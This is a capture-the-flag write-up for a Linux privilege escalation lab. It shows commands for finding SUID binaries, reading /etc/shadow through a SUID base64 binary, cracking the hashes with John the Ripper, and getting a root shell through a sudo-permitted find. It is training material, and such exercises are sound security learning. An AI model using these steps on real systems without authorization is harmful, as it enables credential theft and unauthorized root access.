# Linux privilege escalation - Capstone Challenge Writeup:

## Introduction
By now you have a fairly good understanding of the main privilege escalation vectors on Linux 
and this challenge should be fairly easy.
You have gained SSH access to a large scientific facility. 
Try to elevate your privileges until you are Root.

## Steps

### Step 1: Initial Access and Enumeration
1. **SSH Login**: Logged into the target machine as user `leonard` with the IP `10.x.x.x`.
2. **SUID Check**:
   - Ran the following command to search for files with the SUID bit set:

     ```bash
     find / -type f -perm -04000 -ls 2>/dev/null
     ```

   - Found the `base64` binary with special permissions, which could be exploited to read files.

### Step 2: Exploiting `base64` for File Access
1. **Moving to Directory**:
   - Navigated to `/usr/bin` directory.

2. **Reading Sensitive Files**:
   - Used the command from GTFOBins to read the contents of `/etc/shadow` and `/etc/passwd`:

     ```bash
     ./base64 "/PATH/FILE" | base64 --decode
     ```

   - Copied the contents of `/etc/shadow` and `/etc/passwd` files for password cracking.

### Step 3: Password Cracking
1. **Unshadowing Files**:
   - Ran the following on my machine to combine the `passwd` and `shadow` files:

     ```bash
     unshadow passwd.txt shadow.txt > passwords.txt
     ```

2. **Cracking with John the Ripper**:
   - Used John the Ripper with the `rockyou.txt` wordlist to crack the password:

     ```bash
     john --wordlist=rockyou.txt passwords.txt
     ```

   - Cracked the password for the user `messy`.

### Step 4: Privilege Escalation to User `messy`
1. **Switching User**:
   - Logged in as `messy` using the cracked password:

     ```bash
     su messy
     ```

2. **Flag 1**:
   - Located `flag1.txt` in the `Documents` folder of the `messy` user.

### Step 5: Root Privilege Escalation
1. **Checking Sudo Permissions**:
   - Ran `sudo -l` and found that `find` can be executed with sudo privileges without restriction.

2. **Exploiting `find` for Root Shell**:
   - Used the following command to get a root shell:

     ```bash
     sudo find . -exec /bin/sh \; -quit
     ```

3. **Flag 2**:
   - Navigated to the `/rootflag` directory and found `flag2.txt`.
